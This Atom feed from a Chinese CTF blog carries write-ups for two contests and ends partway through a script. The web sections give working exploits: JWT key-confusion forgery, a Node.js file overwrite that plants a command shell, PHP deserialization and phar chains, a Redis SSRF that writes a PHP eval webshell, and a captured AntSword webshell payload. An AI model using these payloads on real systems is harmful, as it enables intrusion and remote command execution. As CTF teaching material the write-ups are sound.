<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://boooook123.github.io/Artone.github.io/</id>
    <title>Artone &apos;s Blog</title>
    <updated>2022-11-14T06:59:19.296Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://boooook123.github.io/Artone.github.io/"/>
    <link rel="self" href="https://boooook123.github.io/Artone.github.io/atom.xml"/>
    <subtitle>一些细细的琐事。。</subtitle>
    <logo>https://boooook123.github.io/Artone.github.io/images/avatar.png</logo>
    <icon>https://boooook123.github.io/Artone.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, Artone &apos;s Blog</rights>
    <entry>
        <title type="html"><![CDATA[“华为杯”第一届中国研究生网络安全创新大赛web]]></title>
        <id>https://boooook123.github.io/Artone.github.io/post/hua-wei-bei-di-yi-jie-zhong-guo-yan-jiu-sheng-wang-luo-an-quan-chuang-xin-da-sai-web/</id>
        <link href="https://boooook123.github.io/Artone.github.io/post/hua-wei-bei-di-yi-jie-zhong-guo-yan-jiu-sheng-wang-luo-an-quan-chuang-xin-da-sai-web/">
        </link>
        <updated>2022-11-14T03:42:46.000Z</updated>
        <summary type="html"><![CDATA[<p>研究生赛，作为本科生就是过来凑个数。。。</p>
]]></summary>
        <content type="html"><![CDATA[<p>研究生赛，作为本科生就是过来凑个数。。。</p>
<!-- more -->
<h1 id="hackthisbox">HackThisBox</h1>
<p>提供了整个docker源码，</p>
<p>在app中设置了api路径</p>
<pre><code>app.use('/', indexRouter);
app.use('/api', apiRouter);

</code></pre>
<p>api下有两个路由，一个是login</p>
<pre><code class="language-javascript">router.post('/login', function(req, res, next) { //login路由   可控传参username
  const token = jwt.sign({ username: req.body.username, isAdmin: false, home: req.body.username }, privateKey, { algorithm: &quot;RS256&quot; });
  res.send({
    status:200,
    msg:&quot;success&quot;,
    token
  })
})
</code></pre>
<p>有一个jwt认证，采用的是RS256的非对称加密</p>
<p>再看upload路由</p>
<pre><code class="language-javascript">router.post('/upload', function(req, res, next) {
  if(req.files.length !== 0) {
    var savePath = '';
    if(req.auth.isAdmin === false) {
      var dirName = `./public/upload/${req.auth.home}/`  //admin
      fs.mkdir(dirName, (err)=&gt;{   //新建一个目录
        if(err) {
          console.log('error')
        } else {
          console.log('ok')
        }
      });
      savePath = path.join(dirName, req.files[0].originalname);  //路径拼接后缀名 
    } else if(req.auth.isAdmin === true) {
      savePath = req.auth.home;  //可控路径  ./views/index.twig
    }

      fs.readFile(req.files[0].path, function(err, data) {   //
        if(err) {
          return res.status(500).send(&quot;error&quot;);
        } else {
          fs.writeFileSync(savePath, data);
        }
      });
    return res.status(200).send(&quot;file upload successfully&quot;);
  } else {
    return res.status(500).send(&quot;error&quot;);
  }
});
</code></pre>
<p>通过Authorization请求头获取</p>
<h2 id="jwt绕过">jwt绕过</h2>
<p>https://www.freebuf.com/column/170359.html<br>
这里我们利用CVE-2016-5431 - 密钥混淆攻击<br>
此攻击的原因是某些库对签名/验证HMAC对称加密的密钥和包含用于验证RSA签名令牌的公钥的密钥使用相同的变量名。<br>
通过将算法调整为HMAC变体（HS256/HS384/HS512）并使用公共可用公钥对其进行签名，我们可以欺骗服务使用机密变量中的硬编码公钥验证HMAC令牌。<br>
简而言之就是将非对称密码变成了对称密码</p>
<pre><code class="language-javascript">
app.use(expressjwt({ secret: publicKey, algorithms: [&quot;HS256&quot;, &quot;RS256&quot;]}).unless({ path: [&quot;/&quot;, &quot;/api/login&quot;] }))

</code></pre>
<p>这里它同时支持了HS256以及RS256算法，并且都使用publicKey作为公钥，如果现在我们伪造JWT，使得head为</p>
<pre><code>{&quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;} 
</code></pre>
<p>那么服务器就会顺其自然的将它作为HS256去解码，由于HS256是对称加密，所以只要有公钥就可以实现伪造<br>
伪造admin后，我们可以实现任意文件写，由于这里还安装了nodemon这个拓展，也就是说，只要文件发生<br>
更改，整个项目就会自动重载，于是<br>
考虑文件覆盖index.js来实现RCE</p>
<p>但是在app.js设置了一个通防waf</p>
<p>但是还是有绕过的可能，因为任意文件写调用的是writeFileSync()，这个函数和readFileSync()可以说是本是同根生，</p>
<p>也就是说它也可以通过传入url对象，是指对其进行url解码，从而绕过waf</p>
<p>生成一个url对象</p>
<pre><code class="language-javascript">const fs = require('fs');
data = &quot;123&quot;;
fs.writeFileSync(new URL('file:///E:/test.txt'),data);
console.log(new URL('file:///./rout%65s/index.%6as'));
</code></pre>
<p>输出</p>
<pre><code>URL {
  href: 'file:///rout%65s/index.%6as',
  origin: 'null',
  protocol: 'file:',
  username: '',
  password: '',
  host: '',
  hostname: '',
  port: '',
  pathname: '/rout%65s/index.%6as',
  search: '',
  searchParams: URLSearchParams {},
  hash: ''
}
</code></pre>
<p>手动转化为json，放在home字段</p>
<p>exp</p>
<pre><code class="language-python">import jwt

public = open('public.pem', 'r').read()
header = {
  &quot;typ&quot;: &quot;JWT&quot;,
  &quot;alg&quot;: &quot;HS256&quot;
}
payload = {
  &quot;username&quot;: &quot;./index.php&quot;,
  &quot;isAdmin&quot;: True,
    &quot;home&quot;:{&quot;href&quot;: 'file://./rout%65s/ind%65x.%6as',&quot;origin&quot;: 'null',&quot;protocol&quot;: 'file:',&quot;username&quot;: '',&quot;password&quot;: '',&quot;host&quot;: '',&quot;hostname&quot;: '',&quot;port&quot;: '',&quot;pathname&quot;: './rout%65s/ind%65x.%6as',&quot;search&quot;: '',&quot;searchParams&quot;: &quot;URLSearchParams {}&quot;,&quot;hash&quot;: ''},
   &quot;iat&quot;: 1668309016
}
encoded = jwt.encode(payload, public, algorithm='HS256', headers=header)

print(encoded)
</code></pre>
<p>然后再写一个index.js，传进去覆盖原来的index.js，利用模板读取flag</p>
<pre><code class="language-javascript">var express = require('express');
var router = express.Router();

/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('index', { title: require(&quot;child_process&quot;).execSync(&quot;/readflag&quot;).toString() }); 
});

module.exports = router;
</code></pre>
<p>或者直接覆盖掉index.js然后写个shell</p>
<pre><code class="language-javascript">var express = require('express');
var router = express.Router();

var exec = require('child_process').exec;
/* GET home page. */
router.post('/', function(req, res, next) {
    exec(req.body.cmd, function(error, stdout, stderr) {
        if(error){
            console.error(error);
        }
        else{
            console.log(&quot;success&quot;);
        }
        return res.send(stdout);
    });

});

module.exports = router;
</code></pre>
<p>一句话版</p>
<pre><code class="language-javascript">var express = require('express');
var router = express.Router();

/* GET home page. */
router.post('/', function(req, res, next) {
    return res,send(require(&quot;child_process&quot;).exec(req.body.cmd).toString());

});

module.exports = router;
</code></pre>
<p>post给cmd传参</p>
<pre><code>
</code></pre>
<h1 id="misc_bit_qr">misc_Bit_QR</h1>
<p>一个缺少了定位符的二维码，补全定位码直接解，<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1668408973417.png" alt="" loading="lazy"></p>
<p>得到457c</p>
<p>用010打开图片，发现IEND后面还有内容，应该是一个缺了部分文件头的png图片，手动提取一下<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1668408997207.png" alt="" loading="lazy"></p>
<p>得到一张新的二维码，扫码得到半个flag</p>
<p>在原来的那张二维码中还发现有一个很小的idat块，zlib解压出来发现是一串16进制数据</p>
<p>42064652d3431356135323533646230387d0ec187c229c4d4a44</p>
<p>直接解码得到一串乱码，仔细观察发现06这个字节有问题，如果删去0，貌似可以得到一串字符串<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1668408986799.png" alt="" loading="lazy"></p>
<p>又提示了flag中没有大写字母，所以把第一个字母也去掉</p>
<p>全部拼接起来得到最后的flag</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[GFCTF wp]]></title>
        <id>https://boooook123.github.io/Artone.github.io/post/gfctf-wp/</id>
        <link href="https://boooook123.github.io/Artone.github.io/post/gfctf-wp/">
        </link>
        <updated>2022-11-08T06:50:07.000Z</updated>
        <summary type="html"><![CDATA[<p>经典打卡安恒十月月赛，但是这个wp拖更整整一个月了。。😅</p>
]]></summary>
        <content type="html"><![CDATA[<p>经典打卡安恒十月月赛，但是这个wp拖更整整一个月了。。😅</p>
<!-- more -->
<h1 id="web">web</h1>
<h2 id="easypop">EasyPOP</h2>
<p>先看源码</p>
<pre><code class="language-php"> &lt;?php
highlight_file(__FILE__);
error_reporting(0);

class fine
{
    private $cmd;
    private $content;

    public function __construct($cmd, $content)
    {
        $this-&gt;cmd = $cmd;
        $this-&gt;content = $content;
    }

    public function __invoke()
    {
        echo &quot;123&quot;;
        call_user_func($this-&gt;cmd, $this-&gt;content);
    }

    public function __wakeup()
    {
        $this-&gt;cmd = &quot;&quot;;
        die(&quot;Go listen to Jay Chou's secret-code! Really nice&quot;);
    }
}

class show
{
    public $ctf;
    public $time = &quot;Two and a half years&quot;;

    public function __construct($ctf)
    {
        $this-&gt;ctf = $ctf;
    }


    public function __toString()
    {
        return $this-&gt;ctf-&gt;show();
    }

    public function show(): string
    {
        return $this-&gt;ctf . &quot;: Duration of practice: &quot; . $this-&gt;time;
    }


}

class sorry
{
    private $name;
    private $password;
    public $hint = &quot;hint is depend on you&quot;;
    public $key;

    public function __construct($name, $password)
    {
        $this-&gt;name = $name;
        $this-&gt;password = $password;
    }

    public function __sleep()
    {
        $this-&gt;hint = new secret_code();
    }

    public function __get($name)
    {
        $name = $this-&gt;key;
        $name();
    }


    public function __destruct()
    {
        if ($this-&gt;password == $this-&gt;name) {

            echo $this-&gt;hint;
        } else if ($this-&gt;name = &quot;jay&quot;) {
            secret_code::secret();
        } else {
            echo &quot;This is our code&quot;;
        }
    }


    public function getPassword()
    {
        return $this-&gt;password;
    }

    public function setPassword($password): void
    {
        $this-&gt;password = $password;
    }


}

class secret_code
{
    protected $code;

    public static function secret()
    {
        include_once &quot;hint.php&quot;;
        hint();
    }

    public function __call($name, $arguments)
    {
        $num = $name;
        $this-&gt;$num();
    }

    private function show()
    {
        return $this-&gt;code-&gt;secret;
    }
}


if (isset($_GET['pop'])) {
    $a = unserialize($_GET['pop']);
    $a-&gt;setPassword(md5(mt_rand()));
} else {
    $a = new show(&quot;Ctfer&quot;);
    echo $a-&gt;show();
}
Go listen to Jay Chou's secret-code! Really nice123
</code></pre>
<p>pop链：</p>
<pre><code>sorry::destruct -&gt; show::toString -&gt; secret_code::call -&gt; sorry::get -&gt; fine::invoke
</code></pre>
<p>这里想要调用destruct中的hint就需要满足</p>
<pre><code>($this-&gt;password == $this-&gt;name)
</code></pre>
<p>这里他设置了Password，但是是在反序列化之后，所以并没有什么作用，直接传两个值使之相等即可</p>
<p>exp：</p>
<pre><code class="language-php">&lt;?php

class sorry
{
    private $name;
    private $password;
    public $hint;
    public $key;
    public function __construct($name,$password,$hint,$key)
    {
        $this-&gt;name = $name;
        $this-&gt;password = $password;
        $this-&gt;hint = $hint;
        $this-&gt;key = $key;
    }

}
class show
{
    public $ctf;
    public function __construct($ctf)
    {
        $this-&gt;ctf = $ctf;
    }
}
class secret_code
{
    protected $code;
    public function __construct($code)
    {
        $this-&gt;code = $code;
    }
}
class fine
{
    private $cmd;
    private $content;
    public function __construct($cmd, $content)
    {
        $this-&gt;cmd = $cmd;
        $this-&gt;content = $content;
    }

}
$f = new fine(&quot;system&quot;, &quot;cat /*&quot;);
$s1 = new sorry('','','',$f);
$s = new secret_code($s1);
$sh = new show($s);
$a = new sorry(&quot;jay&quot;, &quot;jay&quot;, $sh ,'');

$b = serialize($a);
$b1 = str_replace('&quot;fine&quot;:2', '&quot;fine&quot;:3', $b);
echo urlencode($b1);
# sorry::destruct -&gt; show::toString -&gt; secret_code::call -&gt; sorry::get -&gt; fine::invoke
</code></pre>
<h2 id="hade_waibo">hade_waibo</h2>
<h3 id="非预期">非预期</h3>
<p>没有删start.sh,</p>
<p>任意文件读直接读到start.sh,找到flag的文件名</p>
<h3 id="预期解">预期解</h3>
<p>先登入，不设有密码，随便输一个username就可以登入了</p>
<p>在里面发现一个文件上传点，以及一个文件读取点，没有任何过滤，也就是说可以任意文件读</p>
<p>可以先把相关的源码都读出来</p>
<p>重点在class.php</p>
<pre><code class="language-php">&lt;?php
class User
{
    public $username;
    public function __construct($username){  //由前端的输入触发
        $this-&gt;username = $username;
        $_SESSION['isLogin'] = True;
        $_SESSION['username'] = $username;
    }
    public function __wakeup(){
        $cklen = strlen($_SESSION[&quot;username&quot;]);
        if ($cklen != 0 and $cklen &lt;= 6) {
            $this-&gt;username = $_SESSION[&quot;username&quot;];
        }
    }
    public function __destruct(){
        if ($this-&gt;username == '') {  //触发toString
            session_destroy();  //销毁当前会话中的数据
        }
    }
}

class File
{
    #更新黑名单为白名单，更加的安全
    public $white = array(&quot;jpg&quot;,&quot;png&quot;);

    public function show($filename){  //前端可触发
        echo '&lt;div class=&quot;ui action input&quot;&gt;&lt;input type=&quot;text&quot; id=&quot;filename&quot; placeholder=&quot;Search...&quot;&gt;&lt;button class=&quot;ui button&quot; onclick=&quot;window.location.href=\'file.php?m=show&amp;filename=\'+document.getElementById(\'filename\').value&quot;&gt;Search&lt;/button&gt;&lt;/div&gt;&lt;p&gt;';
        if(empty($filename)){die();}
        return '&lt;img src=&quot;data:image/png;base64,'.base64_encode(file_get_contents($filename)).'&quot; /&gt;';  //可以触发反序列化
    }
    public function upload($type){  //前端可触发
        $filename = &quot;dasctf&quot;.md5(time().$_FILES[&quot;file&quot;][&quot;name&quot;]).&quot;.$type&quot;;
        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot; . $filename);
        return &quot;Upload success! Path: upload/&quot; . $filename;
    }
    public function rmfile(){
        system('rm -rf /var/www/html/upload/*');
    }
    public function check($type){
        if (!in_array($type,$this-&gt;white)){
            return false;
        }
        return true;
    }

}

#更新了一个恶意又有趣的Test类
class Test
{
    public $value;

    public function __destruct(){
        chdir('./upload');
        $this-&gt;backdoor();
    }
    public function __wakeup(){
        $this-&gt;value = &quot;Don't make dream.Wake up plz!&quot;;
    }
    public function __toString(){
        $file = substr($_GET['file'],0,3);
        file_put_contents($file, &quot;Hack by $file !&quot;);
        return 'Unreachable! :)';
    }
    public function backdoor(){
        if(preg_match('/[A-Za-z0-9?$@]+/', $this-&gt;value)){
            $this-&gt;value = 'nono~';
        }
        system($this-&gt;value);
    }

}
</code></pre>
<p>file类中使用file_get_contents函数，从而提供了打phar反序列化的可能，又一个system可以命令执行，但是做了无数字和无字母的过滤，难以直接利用</p>
<p>这里可以分两步来利用system执行命令</p>
<h4 id="第一步">第一步</h4>
<p>构造链子触发toString，来写文件，这里我们可控的只有文件名，不过这已经够了，因为通配符可以匹配文件名，所以只要把文件名设为cat，我们就可以用通配符*在命令执行中代替cat，从而绕过preg_match</p>
<p>链子：</p>
<pre><code>User::destruct -&gt; Test::toString
</code></pre>
<p>为了形成这个链子，我们需要让username=new Test() ，但是__wakeup()会先于__destruct()触发，覆盖掉username的值</p>
<pre><code class="language-php">public function __wakeup(){
        $cklen = strlen($_SESSION[&quot;username&quot;]);
        if ($cklen != 0 and $cklen &lt;= 6) {
            $this-&gt;username = $_SESSION[&quot;username&quot;];
        }
    }
    public function __destruct(){
        if ($this-&gt;username == '') {  //触发toString
            session_destroy();  //销毁当前会话中的数据
        }
    }
</code></pre>
<p>由于版本的原因，这样的wakeup不能有之前的cve来绕过，所以我们只能使它不满足if，也就是让SESSION[&quot;username&quot;]的长度大于6，在最开始的登入界面，前端限制了username的长度，但是可以通过bp等手段去绕过</p>
<p>exp：</p>
<pre><code class="language-php">&lt;?php
class User
{
    public $username;
    function __construct($username)
    {
        $this-&gt;username = $username;
    }
}
class Test
{
    public $value;
    function __construct($value)
    {
        $this-&gt;value = $value;
    }
    
}
@unlink(&quot;phar.phar&quot;);
@unlink(&quot;phar.jpg&quot;);
$Test = new Test(&quot;aa&quot;);
$User = new User($Test);

echo serialize($User);
$phar = new Phar(&quot;phar.phar&quot;);
$phar-&gt;startBuffering();
$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
$phar-&gt; addFromString('test.txt','h3en1');
$phar-&gt;setMetadata($User);
$phar-&gt;stopBuffering();
rename(&quot;phar.phar&quot;,&quot;phar.jpg&quot;);
</code></pre>
<p>upload后，触发phar反序列化</p>
<pre><code>GET /file.php?m=show&amp;filename=phar://./upload/dasctfb886ff1ed98265e607978e50ce7e72f4.jpg/test.txt&amp;file=cat HTTP/1.1
</code></pre>
<p>生成后可以再读一下cat文件，确保已经生成</p>
<h4 id="第二步">第二步</h4>
<p>利用通配符读出所有文件，system里应该执行的是* /*</p>
<p>但是我们可以看到在backdoor执行之前，会触发wakeup，也就是覆盖掉value的值，而且这里并不像User里的wakeup绕过</p>
<pre><code class="language-php">public function __wakeup(){
        $this-&gt;value = &quot;Don't make dream.Wake up plz!&quot;;
    }
    public function __toString(){
        $file = substr($_GET['file'],0,3);
        file_put_contents($file, &quot;Hack by $file !&quot;);
        return 'Unreachable! :)';
    }
    public function backdoor(){
        if(preg_match('/[A-Za-z0-9?$@]+/', $this-&gt;value)){
            $this-&gt;value = 'nono~';
        }
        system($this-&gt;value);
    }
</code></pre>
<p>这里我们只能考虑如何在value被覆盖后再改回来，这里就涉及到了反序列化的执行顺序</p>
<p>如果我的链子是从User打到Test，那么他会先反序列化Test，然后反序列化User，这里我们可以调试一下看看他是怎么反序列化的</p>
<pre><code class="language-php">&lt;?php
class User
{
    public $username;
    public $a;
    public function __construct($a)
    {
        $this-&gt;a = $a;
    }
    public function __wakeup()
    {
        echo &quot;2&quot;;
    }
}
class Test
{
    public $value;
    function __construct($value)
    {
        $this-&gt;value = $value;
    }
    public function __wakeup()
    {
        echo &quot;1&quot;;
    }
}
$Test = new Test(&quot;aa&quot;);
$User = new User($Test); 
$User-&gt;username = &amp;$Test-&gt;value;
$ss = serialize($User);
unserialize($ss);

#12
</code></pre>
<p>所以我们可以通过User里的wakeup重新给username赋回我们想要的值</p>
<p>想要通过username给value赋值细分来说也需要两步</p>
<h5 id="第一步-2">第一步</h5>
<p>注册一个username 为* /*，初始化后会把这个值放在SESSION[&quot;username&quot;]，之后还会赋值给username</p>
<pre><code class="language-php">public function __wakeup(){
        $cklen = strlen($_SESSION[&quot;username&quot;]);
        if ($cklen != 0 and $cklen &lt;= 6) {
            $this-&gt;username = $_SESSION[&quot;username&quot;];
        }
    }
</code></pre>
<h5 id="第二步-2">第二步</h5>
<p>在构造链子的时候使username=&amp;Test-&gt;value，也就是让username变成指向value的指针</p>
<h4 id="final-exp">Final exp：</h4>
<pre><code class="language-php">&lt;?php
class User
{
    public $username;
}
class Test
{
    public $value;
}
@unlink(&quot;phar1.phar&quot;);
@unlink(&quot;phar1.jpg&quot;);
$User = new User();
$Test = new Test();
$User-&gt;a = $Test;  //这里只要链上就行
$User-&gt;username = &amp;$Test-&gt;value;
echo serialize($User);
$phar = new Phar(&quot;phar1.phar&quot;);
$phar-&gt;startBuffering();
$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
$phar-&gt; addFromString('test.txt','h3en1');
$phar-&gt;setMetadata($User);
$phar-&gt;stopBuffering();
rename(&quot;phar1.phar&quot;,&quot;phar1.jpg&quot;);
</code></pre>
<pre><code>GET /file.php?m=show&amp;filename=phar://./upload/dasctfafee6033fe501630864dcaf25a98d1ee.jpg/test.txt
</code></pre>
<h2 id="easylove">EasyLove</h2>
<p>php源码</p>
<pre><code class="language-php">&lt;?php
highlight_file(__FILE__);
error_reporting(0);
class swpu{
    public $wllm;
    public $arsenetang;
    public $l61q4cheng;
    public $love;
    
    public function __construct($wllm,$arsenetang,$l61q4cheng,$love){
        $this-&gt;wllm = $wllm;
        $this-&gt;arsenetang = $arsenetang;
        $this-&gt;l61q4cheng = $l61q4cheng;
        $this-&gt;love = $love;
    }
    public function newnewnew(){
        $this-&gt;love = new $this-&gt;wllm($this-&gt;arsenetang,$this-&gt;l61q4cheng);
    }

    public function flag(){
        $this-&gt;love-&gt;getflag();
    }
    
    public function __destruct(){
        $this-&gt;newnewnew();
        $this-&gt;flag();
    }
}
class hint{
    public $hint;
    public function __destruct(){
        echo file_get_contents($this-&gt; hint.'hint.php');
    }
}
$hello = $_GET['hello'];
$world = unserialize($hello);  
</code></pre>
<p>首先打一个反序列化拿一下hint</p>
<pre><code class="language-php">&lt;?php
class hint{
	public $hint;
	public function __construct($hint){
		$this-&gt;hint = $hint;
	}
}
$h = new hint(&quot;php://filter/read=convert.base64-encode/resource=&quot;);
echo serialize($h);
echo urlencode(serialize($h));
</code></pre>
<p>得到hint</p>
<pre><code class="language-php">&lt;?php
	$hint = &quot;My favorite database is Redis and My favorite day is 20220311&quot;;
?&gt;
</code></pre>
<p>后端有Redis数据库，并且告诉了我们密码</p>
<p>可以看到在</p>
<pre><code>public function newnewnew(){
        $this-&gt;love = new $this-&gt;wllm($this-&gt;arsenetang,$this-&gt;l61q4cheng);
    }
</code></pre>
<p>我们可以构造一个任意类，那么可以尝试调用原生类<strong>SoapClient</strong>，造成SSRF，来打Redis</p>
<p>低版本的Redis会将请求头的内容作为redis命令解析，那么只要我们通过CRLF控制住请求头，再配合SoapClient发起请求即可</p>
<p>exp：</p>
<pre><code class="language-php">&lt;?php
$target='http://127.0.0.1:6379/';  //Redis的默认端口
$poc0=&quot;AUTH 20220311&quot;;  //登入
$poc=&quot;CONFIG SET dir /var/www/html&quot;;  //在无需重启Redis的情况下设置工作目录
//写文件
$poc1=&quot;SET x '&lt;?@eval(\$_POST[1]);?&gt;'&quot;;  //设置一个键来保存字符串
$poc2=&quot;CONFIG SET dbfilename cmd.php&quot;;
$poc3=&quot;SAVE&quot;;
$a = array('location' =&gt; $target,'uri' =&gt; 'hello^^'.$poc0.'^^'.$poc.'^^'.$poc1.'^^'.$poc2.'^^'.$poc3.'^^hello');
$aaa = serialize($a);
$aaa = str_replace('^^',&quot;\r\n&quot;,$aaa);
$c=unserialize($aaa);
class swpu{
    public $wllm = 'SoapClient';
    public $arsenetang = null;
    public $l61q4cheng;
    public $love;
}
$a=new swpu();
$a-&gt;l61q4cheng=$c;
echo urlencode(serialize($a));
?&gt;
</code></pre>
<p>挂上马后再用蚁剑连接，最后suid提权</p>
<h3 id="关于crlf">关于CRLF</h3>
<p>https://www.php.cn/php-weizijiaocheng-491990.html</p>
<pre><code>&lt;?php
$a = new SoapClient(null, arry(
'location' =&gt; 'http://127.0.0.1:6379',
'uri' =&gt; 'uri',
'user_agent' =&gt; &quot;111111\r\nCookie: PHPSESSION=321321313&quot;
));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c-&gt;a();
</code></pre>
<p>可以在uri或者user_agent等字段中，通过\r\n来插入多个请求头，形成CRLF注入</p>
<p>关于Redis命令</p>
<p>https://redis.io/commands/</p>
<h1 id="misc">misc</h1>
<h2 id="滴滴图">滴滴图</h2>
<p>附件是一张图片，以及一个 zip文件，显然是图片隐藏了密码</p>
<p>用winhex打开，可以在最下面看到一个密码this_is_paSS</p>
<p>用binwalk分离一下图片，发现有两个压缩包，用这个密码可以解开</p>
<p>里面是两张一样的图片，发现CRC校验有问题，修改了一下宽高，得到另一个密码</p>
<p>解压最开始的压缩包可以得到音频文件，发现是一段摩斯密码</p>
<p>解出flag</p>
<h2 id="ez_xxd">ez_xxd</h2>
<p>首先是一个流量包，先过滤出http流量，发现有一个flag.txt和maybe_today.zip</p>
<p>这里可以在响应头找到数据块，导出分组字节流，于是就得到了这两个文件</p>
<p>zip设置了密码，于是考虑在flag.txt上找线索，flag.txt中的内容显然是base64，但是解出来的东西并没有明显的端倪</p>
<p>于是，看一下flag.txt的来源</p>
<p>回到流量包，追踪一下shell.php,发现是一个蚁剑流量，先base64解码</p>
<pre><code class="language-php">g0f49a7f453a2e=wdY2QgIi93d3cvYWRtaW4vbG9jYWxob3N0XzgwL3d3d3Jvb3QiO3h4ZCAtcyAweDA4IC1wIC93d3cvYWRtaW4vbG9jYWxob3N0XzgwL3d3d3Jvb3QvTWlrdS5wbmd8YmFzZTY0PmZsYWcudHh0O2VjaG8gMzFhODM7cHdkO2VjaG8gMjk5ZWNkNWNkYg==&amp;s2f57bf194897a=zdL2Jpbi9zaA==&amp;shell=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir=@ini_get(&quot;open_basedir&quot;);if($opdir) {$ocwd=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$oparr=preg_split(&quot;/;|:/&quot;,$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item.&quot;/.722722&quot;;@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}@chdir($tmdir);@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);$cntarr=@preg_split(&quot;/\\\\|\//&quot;,$tmdir);for($i=0;$i&lt;sizeof($cntarr);$i++){@chdir(&quot;..&quot;);};@ini_set(&quot;open_basedir&quot;,&quot;/&quot;);@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo &quot;6d&quot;.&quot;fcb&quot;;echo @asenc($output);echo &quot;8c2&quot;.&quot;fa8&quot;;}ob_start();try{$p=base64_decode(substr($_POST[&quot;s2f57bf194897a&quot;],2));$s=base64_decode(substr($_POST[&quot;g0f49a7f453a2e&quot;],2));$envstr=@base64_decode(substr($_POST[&quot;v09c646ce6cb4a&quot;],2));$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \&quot;{$s}\&quot;&quot;:&quot;/c \&quot;{$s}\&quot;&quot;;if(substr($d,0,1)==&quot;/&quot;){@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;);}else{@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;);}if(!empty($envstr)){$envarr=explode(&quot;|||asline|||&quot;, $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace(&quot;|||askey|||&quot;, &quot;=&quot;, $v));}}}$r=&quot;{$p} {$c}&quot;;function fe($f){$d=explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == &quot;/&quot; &amp;&amp; fe('putenv') &amp;&amp; (fe('error_log') || fe('mail'))) {if (strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) {$tmp = tempnam(sys_get_temp_dir(), 'as');putenv(&quot;PHP_LOL=() { x; }; $c &gt;$tmp 2&gt;&amp;1&quot;);if (fe('error_log')) {error_log(&quot;a&quot;, 1);} else {mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);}} else {return False;}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != &quot;&quot;) {print($output);return True;}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if(fe('system')){@system($c,$ret);}elseif(fe('passthru')){@passthru($c,$ret);}elseif(fe('shell_exec')){print(@shell_exec($c));}elseif(fe('exec')){@exec($c,$o,$ret);print(join(&quot;
&quot;,$o));}elseif(fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe('proc_open')){$p = @proc_open($c, array(1 =&gt; array('pipe', 'w'), 2 =&gt; array('pipe', 'w')), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe('antsystem')){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!=&quot;/&quot; &amp;&amp; @class_exists(&quot;COM&quot;)){$w=new COM('WScript.shell');$e=$w-&gt;exec($c);$so=$e-&gt;StdOut();$ret.=$so-&gt;ReadAll();$se=$e-&gt;StdErr();$ret.=$se-&gt;ReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r.&quot; 2&gt;&amp;1&quot;);print ($ret!=0)?&quot;ret={$ret}&quot;:&quot;&quot;;;}catch(Exception $e){echo &quot;ERROR://&quot;.$e-&gt;getMessage();};asoutput();die();&amp;v09c646ce6cb4a=LI
</code></pre>
<p>第一个参数g0f49a7f453a2e,追踪一下</p>
<pre><code>$s=base64_decode(substr($_POST[&quot;g0f49a7f453a2e&quot;],2))
</code></pre>
<p>可以看到对这个传参的处理，是去掉了前两位然后再base64解码</p>
<p>所以安装这种方式进行解码</p>
<pre><code>cd &quot;/www/admin/localhost_80/wwwroot&quot;;xxd -s 0x08 -p /www/admin/localhost_80/wwwroot/Miku.png|base64&gt;flag.txt;echo 31a83;pwd;echo 299ecd5cdb
</code></pre>
<p>xxd命令将png的十六进制从0X08偏移开始base64加密，也就是去掉前前面8个字节，或者说就是去掉了png的文件头</p>
<p>所以，我们可以base64解码后再手动加上文件头</p>
<p>或者写一个脚本：</p>
<pre><code class="language-python">import base64
f = open(&quot;flag.txt&quot;, 'r')
png = open('flag1.txt', 'ab+')
new = open('new.png', 'wb+')
png.write(b'89504e470d0a1a0a')
for line in f.readlines():
    png.write(base64.b64decode(line).replace(b'\n', b''))
png.close()
flag = open('flag.txt', 'r')
